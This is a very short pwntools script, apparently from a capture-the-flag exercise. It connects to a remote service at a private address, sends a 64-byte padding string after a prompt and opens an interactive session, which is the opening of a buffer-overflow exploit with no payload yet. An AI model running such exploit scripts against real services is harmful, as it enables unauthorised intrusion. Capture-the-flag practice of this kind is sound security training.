from pwn import *
context.terminal = ['gnome-terminal','-x','sh','-c']

#io=process('./pwn')
#io.recvuntil('emulator')

io=remote('172.20.2.8',15865)
io.recvuntil('floor')
pl1='a'*0x40
io.send(pl1)





io.interactive()
